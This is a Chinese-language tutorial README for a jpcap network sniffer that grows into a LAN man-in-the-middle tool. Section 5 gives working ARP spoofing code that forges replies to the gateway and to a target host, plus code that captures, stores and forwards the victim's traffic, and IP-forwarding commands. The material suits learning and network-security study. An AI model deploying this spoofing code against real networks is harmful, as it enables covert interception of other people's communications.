# network-sniffer
基于jpcap的网络嗅探器。

对于Java开发者来说，java.net包里面提供的类和接口提供是TCP UDP两种网络协议的支持，也就是说基于JDK的网络编程都是在**运输层**之上的。如果要深入到网络层，就需要libpcap库的支持（在window系统中是winpcap）。由于libpcap是由C/C++实现的，所以需要一个中间件jpcap来实现转换，我们就可以直接在Java环境中调用jpcap提供的API实现上述需求。

## 1. 环境配置

本人的实验环境:

* 操作系统：Mac OS 10.15.7
* Java版本：Oracle JDK 1.8

首先到tcpdump的[官网](http://www.tcpdump.org)上下载libpcap的latest release。

<img src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210315194948294.png" alt="image-20210315194948294" style="zoom: 67%;" />

解压后cd到解压目录中，分别执行以下命令：

```shell
./configure
make
make install
```

然后到`usr/local/lib`目录下就能找到名为`libpcap.dylib`文件，然后执行以下命令(MAC环境)将其绑定到Java的动态链接库：

```shell
export JAVA_LIBRARY_PATH=usr/local/lib
```

libpcap库安装结束。接下来安装jpcap，首先到https://github.com/jpcap/jpcap 下载源码包，再按以下指示完成步骤：（摘录自https://sites.google.com/site/sipinspectorsite/download/jpcap）

1. Both Java and libpcap are preinstalled on Mac OS X. 
   If any of them is missing you should be able to install them from the Mac OS X install DVD. 
2. Download and install [Xcode](http://developer.apple.com/tools/xcode/). 
   The default installation of Xcode should provide you with the toolchain required for compiling Jpcap.
3. Download and extract Jpcap source build. 
4. Go to ***'*****[Jpcap extracted directory]/src/c**' directory. 
5. Run '**make**'.
6. Copy '**libjpcap.jnilib**' to **'***/Library/Java/Extensions/*' directory. 
7. Copy *'**[Jpcap extracted directory]/******lib/\*jpcap.jar**' to '*/Library/Java/Extensions/*'
   Or, place '*jpcap.jar*' to any directory and include it to your CLASSPATH.

如果执行第5步失败了，也可以直接将本项目`resources`目录下的`libjpcap.jnilib`文件（windows下是dll文件）复制到`/Library/Java/Extensions/`目录下，再将`jpcap.jar`包复制到`jre/lib/ext`目录下让扩展类加载器加载，或者放到自己设定的类路径下由系统类加载器加载。

测试环境：

```java
NetworkInterface[] devices = JpcapCaptor.getDeviceList();
String[] names = new String[devices.length];
for (int i = 0; i < names.length; i++) {
	names[i] = (devices[i].description == null ? devices[i].name : devices[i].description);
	System.out.println(names[i]);
}
```

结果：打印出了所有网卡的名称：

```shell
en0
p2p0
awdl0
llw0
utun0
utun1
utun2
utun3
lo0
bridge0
en1
en2
gif0
stf0
XHC0
XHC20
```

至此前期环境搭建完成。



## 2. 熟悉API

由于官方API比较难找，因此我从网络上收集了一些API介绍放到此处。JPCAP中比较重要的4个类：

### NetworkInterface

该类的每一个实例代表一个网络设备，一般就是网卡。这个类只有一些数据成员，除了继承自java.lang.Object的基本方法以外，没有定义其它方法。

数据成员：

| 返回值类型                      | 名称                 | 描述                                                         |
| ------------------------------- | -------------------- | ------------------------------------------------------------ |
| java.lang.String                | datalink_description | 数据链路层的描述。描述所在的局域网是什么网。例如，以太网（Ethernet）、无线LAN网（wireless LAN）、令牌环网(token ring)等等。 |
| java.lang.String                | datalink_name        | 该网络设备所对应数据链路层的名称。具体来说，例如Ethernet10M、100M、1000M等等。 |
| java.lang.String                | description          | 网卡是XXXX牌子XXXX型号之类的描述。                           |
| boolean                         | Loopback             | 标志这个设备是否loopback设备。                               |
| byte[]                          | mac_address          | 网卡的MAC地址，6个字节。                                     |
| java.lang.String                | Name                 | 这个设备的名称。例如我的网卡名称：\Device\NPF_{3CE5FDA5-E15D-4F87-B217-255BCB351CD5} |
| jpcap.NetworkInterfaceAddress[] | addresses            | 设备IP地址（暂且这么理解）                                   |

### JpcapCaptor

该类提供了一系列静态方法来实现一些基本的功能。该类一个实例代表建立了一个与指定设备的链接，可以通过该类的实例来控制设备，例如设定网卡模式、设定过滤关键字等等。

数据成员：

| 返回值类型 | 名称             | 描述             |
| ---------- | ---------------- | ---------------- |
| int        | dropped_packets  | 抛弃的包的数目。 |
| int        | received_packets | 收到的包的数目。 |

成员方法：

| 返回值类型               | 方法名                                                       | 描述                                                         |
| ------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| staticNetworkInterface[] | getDeviceList()                                              | 返回一个网络设备列表。                                       |
| staticJpcapCaptor        | openDevice(NetworkInterface interface, intsnaplen, booleanpromisc, intto_ms) | 创建一个与指定设备的连接并返回该连接。注意，以上两个方法都是静态方法。<br/><br/>Interface：要打开连接的设备的实例；<br/><br/>Snaplen：这个是比较容易搞混的一个参数。其实这个参数不是限制只能捕捉多少数据包，而是限制每一次收到一个数据包，只提取该数据包中前多少字节；<br/><br/>Promisc：设置是否混杂模式。处于混杂模式将接收所有数据包，若之后又调用了包过滤函数setFilter()将不起任何作用；<br/><br/>To_ms：这个参数主要用于processPacket()方法，指定超时的时间； |
| void                     | Close()                                                      | 关闭调用该方法的设备的连接，相对于openDivece()打开连接。     |
| JpcapSender              | getJpcapSenderInstance()                                     | 该返回一个JpcapSender实例，JpcapSender类是专门用于控制设备的发送数据包的功能的类。 |
| Packet                   | getPacket()                                                  | 捕捉并返回一个数据包。这是JpcapCaptor实例中四种捕捉包的方法之一。 |
| int                      | loopPacket(intcount, PacketReceiver handler)                 | 捕捉指定数目的数据包，并交由实现了PacketReceiver接口的类的实例处理，并返回捕捉到的数据包数目。如果count参数设为－1，那么无限循环地捕捉数据。<br/><br/>这个方法不受超时的影响。还记得openDivice()中的to_ms参数么？那个参数对这个方法没有影响，如果没有捕捉到指定数目数据包，那么这个方法将一直阻塞等待。<br/>PacketReceiver中只有一个抽象方法void receive(Packet p)。 |
| int                      | processPacket(intcount, PacketReceiver handler)              | 跟loopPacket()功能一样，唯一的区别是这个方法受超时的影响，超过指定时间自动返回捕捉到数据包的数目。 |
| int                      | dispatchPacket(intcount, PacketReceiverhandler)              | 跟processPacket()功能一样，区别是这个方法可以处于“non-blocking”模式工作，在这种模式下dispatchPacket()可能立即返回，即使没有捕捉到任何数据包。 |
| void                     | setFilter(java.lang.Stringcondition, booleanoptimize)        | condition：设定要提取的包的关键字。<br/><br/>Optimize：这个参数在说明文档以及源代码中都没有说明，只是说这个参数如果为真，那么过滤器将处于优化模式。 |
| void                     | setNonBlockingMode(booleannonblocking)                       | 如果值为“true”，那么设定为“non-blocking”模式。               |
| void                     | breakLoop()                                                  | 当调用processPacket()和loopPacket()后，再调用这个方法可以强制让processPacket()和loopPacket()停止。 |



### JpcapSender

该类专门用于控制数据包的发送。

成员方法：

| 返回值类型        | 方法名                    | 描述                                                         |
| ----------------- | ------------------------- | ------------------------------------------------------------ |
| void              | close()                   | 强制关闭这个连接。                                           |
| staticJpcapSender | openRawSocket()           | 这个方法返回的JpcapSender实例发送数据包时将自动填写数据链路层头部分。 |
| void              | sendPacket(Packet packet) | JpcapSender最重要的功能，发送数据包。需要注意的是，如果调用这个方法的实例是由JpcapCaptor的getJpcapSenderInstance()得到的话，需要自己设定数据链路层的头，而如果是由上面的openRawSocket()得到的话，那么无需也不能设置，数据链路层的头部将由系统自动生成。 |



### Packet

这个是所有其它数据包类的父类。Jpcap所支持的数据包有：
ARPPacket、DatalinkPacket、EthernetPacket、ICMPPacket、IPPacket、TCPPacket、UDPPacket



## 3.抓包测试

抓一个TCP包试试，编写Java程序：

开一个线程抓包：

```java
private void startCaptureThread() {
  if (captureThread != null)
    return;

  captureThread = new Thread(new Runnable() {
    public void run() {
      while (captureThread != null) {
        if (jpcap.processPacket(1, handler) == 0 && !isLive)
          stopCaptureThread();
        Thread.yield();
      }
      jpcap.breakLoop();
    }
  });
  captureThread.setPriority(Thread.MIN_PRIORITY);//设置线程优先级
  captureThread.start();
}
//停止捕获数据包
public void stopCaptureThread() {
  captureThread = null;
}
```

测试：

```java
@Test
public void test() throws InterruptedException {
  Captor captor = new Captor();
  //        String[] devices = captor.showDevice();
  captor.chooseDevice(0);
  captor.setFilter("tcp");//设置提取关键字
  captor.capturePackets();//抓包
  while(true){
    System.out.println("开始抓包");
    Thread.sleep(1000);
    List<Packet> packets = captor.getPackets();//提取数据包
    if(!packets.isEmpty()){
      for (Packet packet : packets) {//显示数据包内容
        System.out.println(captor.showPacket(packet));
      }
      break;
    }
  }
  System.out.println("抓包结束");
}
```

抓取成功，结果：

![image-20210315211433345](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210315211433345.png)



## 4.解析数据包

在第2节中介绍到：`Packet`是所有其它数据包类的父类。因此我们针对Packet编写一个抽象类`AbstractPacket`，规范一些各类数据包统一的操作。

```java
package com.hyc.packet;

import com.hyc.metadata.Layer;
import jpcap.packet.Packet;
import java.util.List;

/**
 * @author kol Huang
 * @date 2021/3/12
 */
public abstract class AbstractPacket {

    //数据包属于OSI模型的哪一层，默认为数据链路层。
    public Layer layer = Layer.DATALINK_LAYER;
    //协议名称
    private String protocolName;
    /**
     * 抽象方法：验证数据包是否属于某个子类
     * @param packet
     * @return
     */
    public abstract boolean verify(Packet packet);

    /**
     * 抽象方法：对数据包进行解析
     * @param packet
     */
    public abstract List<String> parse(Packet packet);

    public String getProtocolName() {
        return protocolName;
    }

    public void setProtocolName(String protocolName) {
        this.protocolName = protocolName;
    }
}

```



仍旧以TCP数据包解析为例。假设我们通过setFilter()过滤，然后抓到了一个TCP数据包packet。首先从数据链路层开始分析，下图分别是802标准以及以太网的帧结构。

![image-20210316183603904](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210316183603904.png)

在jpcap中，对以太网数据包的封装是`EthernetPacket`类，主要内容有以下几项：

1. 帧类型。标识以太帧处理完成之后将被发送到哪个上层协议进行处理。
2. MAC地址。

```java
public byte[] dst_mac;
public byte[] src_mac;
public short frametype;
```

我们就按上面这三个字段解析以太网帧。首先新建一个`Ethernet`类表示以太网帧，并继承`AbstractPacket`。在其中实现verify方法和parse方法。

jpcap为我们提供了以太网帧的封装类`EthernetPacket`，因此在verify方法中，我们只需判断当前的packet是否属于`EthernetPacket`类型即可。

```java
public boolean verify(Packet p){
  return p.datalink instanceof EthernetPacket;
}
```

在封装类`EthernetPacket`中，jpcap提供了若干方法用于访问数据包内容，我们就利用这些方法编写parse方法解析以太网帧：

```java
	public List<String> parse(Packet p){
		List<String> parsedData = new ArrayList<String>();
		if(!verify(p)) return null;
		//获取jpcap封装的数据链路packet
		ethp = (EthernetPacket)p.datalink;
		parsedData.add("Frame Type: "+ethp.frametype);
		parsedData.add("Source MAC Address: "+ethp.getSourceAddress());
		parsedData.add("Destination MAC Address: "+ethp.getDestinationAddress());
		return parsedData;
	}
```

解析结果：

![image-20210316193523892](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210316193523892.png)

接下来解析IP包。创建IPv4类，继承`AbstractPacket`，同样的思路，用jpcap封装好的`IPPacket`实现IPv4数据包的verify和parse方法。

```java
public boolean verify(Packet p){
  return p instanceof IPPacket && ((IPPacket) p).version == 4;
}
```

```java
public List<String> parse(Packet packet){
		List<String> parsedData = new ArrayList<String>();

		if(!verify(packet)) return null;
		final IPPacket ipv4p = (IPPacket)packet;
		parsedData.add("Version: 4");
		parsedData.add("Priority: "+ipv4p.priority);
		parsedData.add("Throughput: "+ipv4p.t_flag);
		parsedData.add("Reliability: "+ipv4p.r_flag);
		parsedData.add("Length: "+ipv4p.length);//数据报长度，单位是字节
		parsedData.add("Identification: "+ipv4p.ident);
		parsedData.add("Don't Fragment: "+ipv4p.dont_frag);//不对数据报进行分片
		parsedData.add("More Fragment: "+ipv4p.more_frag);//除了最后一片外，其他每个组成数据报的片都要把该比特置1。 
		parsedData.add("Fragment Offset: "+ipv4p.offset);//数据报的偏移量
		parsedData.add("Time To Live: "+ipv4p.hop_limit);//TTL
		parsedData.add("Protocol: "+ipv4p.protocol);//协议字段
		parsedData.add("Source IP: "+ipv4p.src_ip.getHostAddress());
		parsedData.add("Destination IP: "+ipv4p.dst_ip.getHostAddress());
		parsedData.add("Source Host Name: "+ipv4p.src_ip.getHostName());
		parsedData.add("Destination Host Name: "+ipv4p.dst_ip.getHostName());
		return parsedData;
	}
```

IP数据报的内容众多，结构如下：

![image-20210316192859961](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210316192859961.png)

解析结果：

![image-20210316193546007](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210316193546007.png)

最后解析TCP报文段。jpcap对TCP报文段的封装类是`TCPPacket`，TCP报文段结构如下所示：

![image-20210316194225746](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210316194225746.png)

```java
public boolean verify(Packet p){
		return p instanceof TCPPacket;
	}
	
	public String getProtocolName(){
		return "TCP";
	}
	
	public List<String> parse(Packet p){
		List<String> parsedData = new ArrayList<String>();

		if(!verify(p)) return null;

		TCPPacket tcp = (TCPPacket)p;

		parsedData.add("Source Port: "+tcp.src_port);
		parsedData.add("Destination Port: "+tcp.dst_port);
		parsedData.add("Sequence Number: "+tcp.sequence);
		parsedData.add("Ack Number: "+tcp.ack_num);
		parsedData.add("URG Flag: "+tcp.urg);
		parsedData.add("ACK Flag: "+tcp.ack);
		parsedData.add("PSH Flag: "+tcp.psh);
		parsedData.add("RST Flag: "+tcp.rst);
		parsedData.add("SYN Flag: "+tcp.syn);
		parsedData.add("FIN Flag: "+tcp.fin);
		parsedData.add("Window Size: "+tcp.window);

		return parsedData;
	}
```

TCP报文段应该非常熟悉了，不再解释。解析结果如下：

![image-20210316194333948](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210316194333948.png)

至此一个TCP报文段解析完毕。

再按同样的方法编写ARP、IPv6、UDP、HTTP等常见协议，就能基本实现抓包和解析功能。



## 5. 局域网数据嗅探

大致了解了JPCAP的使用方式后，我打算参考[项目](https://github.com/hustakin/jpcap-mitm)开发基于局域网嗅探实现点对点MITM攻击的WEB项目（前后端分离），实现：

1. 局域网ARP Spoofing；
2. 嗅探指定终端的上/下行链路数据包；
3. 数据包内容分析及前端可视化。

前端我直接采用了该项目的前端模块（Angular6 + Echarts），此项目实现了前后端分离，因此我只需要编写后端模块为前端接口提供JSON数据即可，该前端模块的接口调用方式如下：

![image-20210323210343382](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210323210343382.png)





### 5.1 替换Dao

该[项目](https://github.com/hustakin/jpcap-mitm)采用MongoDB作为数据存储引擎，我将其更换成了Redis。如果我们使用默认的`Redis`配置，由于springboot只提供了`RedisTemplate<Object, Object>`和`StringRedisTemplate`两种模版，因此只支持`string`类型的序列化器。但是我们需要将对象序列化到redis中，所以需要自定义`redisTemplate`，并配置序列化器。

在Springboot 2.x中将默认的Redis客户端更换为`lettuce`，因此在配置`redis`的时候需要格外注意。`lettuce`的自定义方式与`jedis`有些不同，首先在`config`包下创建`RedisConfig`类，该类需继承`CachingConfigurerSupport`类。然后编写方法注入Bean到IOC容器中：

```java
/**
 * 实例化 RedisTemplate 对象
 *
 * @return
 */
@Bean(name = "redisTemplate")
public RedisTemplate<String, Object> redisTemplate(RedisConnectionFactory redisConnectionFactory) {
  RedisTemplate<String, Object> redisTemplate = new RedisTemplate<>();
  redisTemplate.setConnectionFactory(redisConnectionFactory);
  //配置序列化方式
  //JSON序列化配置
  Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer(Object.class);
  redisTemplate.setKeySerializer(new StringRedisSerializer());
  redisTemplate.setHashKeySerializer(new StringRedisSerializer());
  redisTemplate.setHashValueSerializer(new GenericJackson2JsonRedisSerializer());
  redisTemplate.setValueSerializer(jackson2JsonRedisSerializer);//设置value的序列化器为jackson，这样能够保证对象被成功序列化
  redisTemplate.afterPropertiesSet();
  return redisTemplate;
}
```

**需要注意的是：被序列化的类需要实现`Serializable`接口。**

完成以上步骤就能直接通过IOC容器获取自定义的`redisTemplate`模版了。我们将其封装到`RedisMapper`类中，统一处理`dao`的各种操作。

```java
/**
 * @author kol Huang
 * @date 2021/3/22
 */
@Component
public class RedisMapper {

    @Resource
    @Qualifier("redisTemplate")
    private RedisTemplate<String, Object> redisTemplate;

    public void setRedisTemplate(RedisTemplate<String, Object> redisTemplate) {
        this.redisTemplate = redisTemplate;
    }

    /**
     * 普通缓存获取
     * @param key 键
     * @return 值
     */
    public Object get(KeyPrefix prefix, String key){
        String realKey = prefix.getPrefix().concat(key);
        return redisTemplate.opsForValue().get(key);
    }

    /**
     * 普通缓存放入
     * @param key 键
     * @param value 值
     * @return true成功 false失败
     */
    public boolean set(KeyPrefix prefix, String key,Object value) {
        try {
            String realKey = prefix.getPrefix().concat(key);
            redisTemplate.opsForValue().set(realKey, value);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }

    }

    /**
     * 普通缓存放入并设置时间
     * @param key 键
     * @param value 值
     * @param time 时间(秒) time要大于0 如果time小于等于0 将设置无限期
     * @return true成功 false 失败
     */
    public boolean set(KeyPrefix prefix, String key,Object value,long time){
        try {
            if(time > 0){
                String realKey = prefix.getPrefix().concat(key);
                redisTemplate.opsForValue().set(realKey, value, time, TimeUnit.SECONDS);
            }else{
                set(prefix, key, value);
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    /**
     * 删除缓存
     * @param key 可以传一个值或多个
     */
    public void del(KeyPrefix prefix, String ... key){
        if(key != null && key.length > 0){
            if(key.length == 1){
                String realKey = prefix.getPrefix().concat(key[0]);
                redisTemplate.delete(realKey);
            }else{
                //加前缀
                Collection<String> keys = new ArrayList<>();
                for (String s : key) {
                    keys.add(prefix.getPrefix().concat(s));
                }
                redisTemplate.delete(keys);
            }
        }
    }

}

```

### 5.2 AttackConfig

由于ARP spoof的需求，我们需要获取到以下信息：

* 本地IP/MAC地址
* 目标IP/MAC地址
* 网关IP/MAC地址

因此我们将以上信息封装到一个配置类中，即`AttackConfig`。这些配置信息中的`本地IP/MAC地址`信息可以在web项目初始化的时候就自动从设备上获取，因此我们在`AttackService`类（位于`service`层）中编写初始化方法：

```java
@PostConstruct
public void initDefaultConfig(){
  this.initDeviceList();

  AttackConfig config = (AttackConfig) redisMapper.get(AttackKey.config, "config");
  if(config == null){
    ...

      //获取本地IP和MAC地址
      Map<String, String> addrs = NetworkUtils.getLocalAddress();
    if(addrs == null){
      addrs = NetworkUtils.getPublicAddress();
    }
    if(addrs != null){
      srcIP = addrs.get("ip");
      srcMAC = addrs.get("mac");
    }else{
      logger.error("can not acquire source IP/MAC address");
    }
    config = new AttackConfig();
    config.setDeviceName(null);
    ...
      config.setGateMac(gateMAC);
    config.setGateIP(gateIP);
    redisMapper.set(AttackKey.config, "config", config);
  }

}
```

在方法上加`@PostConstruct`注解可以让这个方法在web容器启动并初始化Servlet的时候被执行，在Spring IOC容器中是通过`CommonAnnotationBeanPostProcessor`实现的。通常我们会是在Spring框架中使用到@PostConstruct注解 该注解的方法在整个Bean初始化中的执行顺序：

`Constructor`(构造方法) -> `@Autowired`(依赖注入) -> `@PostConstruct`(注释的方法)

### 5.3 获取网卡列表

编写`AttackController`，获取网卡列表，并序列化返回给前端。

```java
/**
 * @author kol Huang
 * @date 2021/3/22
 */
@Controller
@RequestMapping("attack")
public class AttackController {

    @Autowired
    private AttackService attackService;

    @GetMapping(value = "/getDeviceList")
    @ResponseBody
    public List<NetWorkInterface> getDeviceList(){
        List<NetWorkInterface> devices = new ArrayList<>();
        NetworkInterface[] interfaces = attackService.getDevices();
        if(interfaces != null){
            for (NetworkInterface networkInterface : interfaces) {
                NetWorkInterface ni = new NetWorkInterface();
                ni.setName(networkInterface.name);
                ni.setDescription(networkInterface.description);
                ni.setDataLinkName(networkInterface.datalink_name);
                ni.setDataLinkDescription(networkInterface.datalink_description);
                devices.add(ni);
            }
        }
        return devices;
    }
}

```



启动项目，发起请求：`http://localhost:8081/attack/getDeviceList`，结果如下

![image-20210323214332832](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210323214332832.png)



### 5.4 接口对接测试

既然已经编写好了一个接口，那么我们就尝试着跟前端模块对接一下，防止项目庞大后对接问题的堆积。

修改前端模块的`attack.service.ts`文件，将`/getDeviceList`请求路径改写成我们自己的请求路径：

![image-20210324204211899](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210324204211899.png)

分别启动angular项目和springboot项目，注意：这里应当用`proxy`的方式启动前端项目，将`localhost:8081`作为代理处理请求。

![image-20210324204458217](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210324204458217.png)

结果：前端成功获取并显示了所有网卡名称。

![image-20210324204611650](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210324204611650.png)



### 5.5 攻击核心代码

此项目的其中一个核心功能就是对抓取的网络数据包进行一系列操作，如分组、拼接、解压、还原等。所以就不再描述其他细节问题，重点讲讲上述核心功能的实现。

首先，在前端页面上初次填写攻击配置信息（srcIP, dstIP, gateIP等）后，点击setup configs按钮，后端会接收到一个路径为`attack/updateConfigAndOpenDevice`的请求。随即根据表单的数据更新攻击配置信息（存入redis），然后根据配置信息选择网卡，并调用以下两个来自Jpcap包的方法打开网卡设备：

```java
public static jpcap.JpcapCaptor openDevice(jpcap.NetworkInterface intrface, int snaplen, boolean promisc, int to_ms) throws java.io.IOException
public jpcap.JpcapSender getJpcapSenderInstance()
```

然后等待前端下达指令就开始抓包。

![image-20210325192544852](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210325192544852.png)

这里遇到了一个问题，我在使用redisTemplate从redisget配置信息的时候报错，如下：

```shell
java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to com.XXX.XXX.xxClass
```

从redis反序列化出来的时候，所有的对象都变成了LinkedHashMap。

查了资料，原因是：在配置redisconfig的时候，我定义的MyObjectMapper没有配置`DefaultTyping`属性，jackson将使用简单的数据绑定具体的java类型，其中Object就会在反序列化的时候变成LinkedHashMap。如何解决呢？

解决办法就是在get之后用`ObjectMapper`来转换：

```java
public Object get(KeyPrefix prefix, String key, Class<?> clazz){
  String realKey = prefix.getPrefix().concat(key);
  ObjectMapper mapper = new ObjectMapper();
  return mapper.convertValue(redisTemplate.opsForValue().get(realKey), clazz);
}
```

但是问题应该是出在`RedisConfig`的配置中，先不处理它。

#### 5.5.1 伪装

接下来开始编写攻击代码，攻击走的请求路径是`/attack/startAttack`，所以我们在`AttackController`中编写攻击的代码：

```java
@GetMapping("/startAttack")
@ResponseBody
public ResultDTO startAttacking(){
  logger.info("start attacking");
  attackService.attack();
  return new ResultDTO(true);
}
```

去调用Service层的`attack`方法执行攻击流程。

首先是创建用于spoofing的ARP包：

1. 创建一个ARP包发送给目标主机，将自己伪装成网关；
2. 创建一个ARP包发送给网关，将自己伪装成目标主机。

```java
public synchronized void attack(){
  //当前处于攻击状态，说明已经有线程在攻击了，所以当前线程直接返回
  if(attacking)   return;
  attacking = true;

  startAttackTimeStamp = new Date();//记录当前时间
  //为了方便统计数据，我们为每次攻击都设置一个批次ID，即batchId
  //这个batchId需要是自增的，如何获取一个自增的batchId呢？
  //那就还从redis里取，但是这个batchId必须跟每次攻击的数据包对应好，否则就乱了
  //OK，那我们就在初始化Servlet的时候，就在Redis里设置一个存id的键，如果不存在，那就创建一个，具体操作见方法initBatchId
  batchId = (Integer) redisMapper.get(CommonKey.COMMON_KEY, "batch_id", Integer.class);
  //这里没考虑并发修改redis的batchId的问题，因为同一时间只有一个线程会执行攻击方法
  //因为AttackService默认是单例的，锁上之后，别的线程也没法调用attack方法，也就不会并发修改batchId
  //但是仍旧是线程不安全的，如果要实现线程安全，可以选择加分布式锁，即执行redis的set lock:batchid true ex 5 nx
  //这里就不实现了
  batchId++;

  //设置ARP包欺骗目标主机，将自己伪装成网关
  ARPPacket arpToDst = createARPPacket(srcMACBT, gateIPIA.getAddress(), dstMACBT, dstIPIA.getAddress());


  //设置ARP包欺骗网关，假装自己是目标主机，因此源IP地址需要改成攻击目标的IP地址，但是MAC地址修改成本地主机的MAC地址
  //这样就能让网关认为本地主机的MAC地址是攻击目标的MAC地址，进而将需要发到目标主机的数据包通过ARP表发到本地主机的网卡上
  ARPPacket arpToGate = createARPPacket(srcMACBT, dstIPIA.getAddress(), gateMACBT, gateIPIA.getAddress());

	...
}
```

创建ARP包的方法如下：

```java
private ARPPacket createARPPacket(byte[] sHardAddr, byte[] sProtoAddr,byte[] tHardAddr, byte[] tProtoAddr){
  ARPPacket arpPacket = new ARPPacket();
  arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
  arpPacket.prototype = ARPPacket.PROTOTYPE_IP;
  arpPacket.operation = ARPPacket.ARP_REPLY;//设置操作类型为应答
  arpPacket.hlen = 6;//硬件地址长度
  arpPacket.plen = 4;//协议类型长度
  arpPacket.sender_hardaddr = sHardAddr;//发送端MAC地址
  arpPacket.sender_protoaddr = sProtoAddr;//发送端IP地址
  arpPacket.target_hardaddr = tHardAddr;//目标MAC地址
  arpPacket.target_protoaddr = tProtoAddr;//目标IP地址

  //定义以太网首部
  EthernetPacket ethernetPacket = new EthernetPacket();
  ethernetPacket.frametype = EthernetPacket.ETHERTYPE_ARP;//设置帧类型为ARP帧
  ethernetPacket.src_mac = sHardAddr;//源MAC地址
  ethernetPacket.dst_mac = tHardAddr;//目标MAC地址
  //添加以太网首部
  arpPacket.datalink = ethernetPacket;
  return arpPacket;
}
```



#### 5.5.2 欺骗

伪装包已经创建好了，那就开始欺骗吧。原项目中直接`new`线程发包了，我改一下，我用线程池。

```java
//使用线程池
private static final int CORE_POOL_SIZE = 5;//核心线程数
private static final int MAXIMUM_POOL_SIZE = 10;//最大线程数
private static final long KEEP_ALIVE_TIME = 1L;//空闲保活时间
private static final TimeUnit UNIT = TimeUnit.MILLISECONDS;//时间单位
private static final int QUEUE_CAPACITY = 5;//任务队列最大长度
static ThreadPoolExecutor executor = new ThreadPoolExecutor(
  CORE_POOL_SIZE,
  MAXIMUM_POOL_SIZE,
  KEEP_ALIVE_TIME,
  UNIT,
  new ArrayBlockingQueue<>(QUEUE_CAPACITY),//有界阻塞队列
  new ThreadPoolExecutor.CallerRunsPolicy()//饱和策略选择调用线程帮忙的策略
);
```

发包：

```java
//主线程调用方法，子线程发包
sendPacket(arpToDst, arpToGate);


private void sendPacket(Packet packet1, Packet packet2){
  Runnable task = new Runnable() {
    @Override
    public void run() {
      while(attacking){
        try{
          if(sender != null && attacking){
            sender.sendPacket(packet1);
          }
          if(sender != null && attacking){
            sender.sendPacket(packet2);
          }
          //控制发包的速度
          Thread.sleep(500);
        } catch (Throwable e) {
          logger.error("Unknown error occur in send thread, ", e);
        }
      }
    }
  };
  executor.execute(task);
}
```

发完包之后，就可以准备接收并转发包，因为网关和目标主机会响应这些ARP请求。

我们在配置攻击参数的时候，设置了`filterDomains`参数，即我们只抓取与这些域名相关的数据包。所以我们从网卡拿包的时候，需要进行过滤。过滤完之后，针对数据包的不同类型执行不同的转发操作：

* 如果是上行链路，转发到网关
* 如果是下行链路，转发到目标主机

同时将数据包按批次号保存到redis，以便后续分析。

```java
private void receiveAndForwardingPacket(){
  Runnable task = new Runnable() {
    @Override
    public void run() {
      while(attacking){
        try{
          //接收数据包
          Packet packet = captor.getPacket();
          if(packet != null && packet != Packet.EOF){
            //检查是否是IP包
            if(packet instanceof IPPacket){
              IPPacket ipPacket = (IPPacket) packet;
              //数据包属于filterDomain
              if(isRelatedToSpecificDomains(ipPacket.src_ip.getHostAddress())
                 || isRelatedToSpecificDomains(ipPacket.dst_ip.getHostAddress())){
                //将数据包转发到目标主机并保存到数据库

                //如果这个数据包的源IP地址是目标主机的IP地址，那么说明是上行链路的数据包
                if(ipPacket.src_ip.getHostAddress().equals(config.getDestIp())){
                  //如果这个数据包的源MAC地址是本地主机的MAC地址，说明这是我自己发送的攻击数据包，需要忽略
                  if(packet.datalink instanceof EthernetPacket){
                    EthernetPacket eth = (EthernetPacket) packet.datalink;
                    String macFromCap = eth.getSourceAddress();
                    if(!macFromCap.equalsIgnoreCase(config.getSrcMac())){
                      savePacket(ipPacket, true);
                    }
                  }
                  forward(ipPacket, gateMACBT);
                }
                //如果这个数据包的目的IP地址是目标主机的IP地址，那么说明是下行链路的数据包
                else if(ipPacket.dst_ip.getHostAddress().equals(config.getDestIp())){
                  savePacket(ipPacket, false);
                  forward(ipPacket, dstMACBT);
                }
              }
            }

            //检查是否是ARP包
            if(packet instanceof ARPPacket){
              ....
            }
          }
        }catch (Throwable e){
          ...
        }
      }
    }
  };
  executor.execute(task);
}
```

接下来测试欺骗能否成功，运行程序，并访问请求`attack/startAttack`，此时服务端会开启两个子线程：

1. 一个线程用于发送欺骗包给目标主机和网关，进行欺骗。
2. 一个线程从网卡上抓包，看看能否抓到目标主机访问`filterDomain`的数据包。

首先在目标主机上查看ARP表，判断是否欺骗成功：

![image-20210329191331592](https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210329191331592.png)

如上图所示，已经成功将目标主机的网关MAC地址修改为了本地主机的MAC地址，因此目标主机发送的数据包都会经过本地主机的网卡。接下来我们在目标主机上访问`filterDomain`，并在服务端开启第二个线程抓包。结果失败了，压根没抓到目标主机的数据包，为什么呢？检查发现目标主机已经不能访问Internet了，发不出包。

既然MAC地址已经是本地主机了，说明目标主机的数据包应该能够发送到本地主机的网卡上，有可能是本地主机的网卡没开启IP转发，因为即使数据包接收到了，程序也调用了转发方法，但是底层的设备不支持IP转发，目标主机仍旧是无法访问Internet的。

所以我们尝试在本地主机上开启IP转发功能：

1. 在MAC上：
   1. 开启IP转发：sudo sysctl -w net.inet.ip.forwarding=1
   2. 查看IP转发已开启（为1）：sudo sysctl -a | grep net.inet.ip.forwarding

2. 在windows上：
   1. 开启IP转发：以管理员身份打开注册表编辑器，定位注册项HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Services/Tcpip/Parameters，选择项目IPEnableRouter并修改数值为1

